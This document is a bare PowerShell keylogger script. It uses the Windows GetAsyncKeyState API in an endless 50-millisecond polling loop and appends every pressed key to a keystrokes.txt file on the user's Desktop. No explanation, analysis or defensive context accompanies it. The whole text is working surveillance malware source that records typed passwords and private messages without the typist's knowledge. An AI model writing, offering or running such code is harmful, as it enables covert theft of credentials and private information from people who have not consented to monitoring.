$logfile = "$env:USERPROFILE\Desktop\keystrokes.txt"
$signatures = @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);
}
"@
Add-Type -TypeDefinition $signatures -Language CSharp

while ($true) {
    Start-Sleep -Milliseconds 50
    for ($ascii = 8; $ascii -le 222; $ascii++) {
        if ([Keyboard]::GetAsyncKeyState($ascii) -eq -32767) {
            $char = [char]$ascii
            Add-Content -Path $logfile -Value $char
        }
    }
}
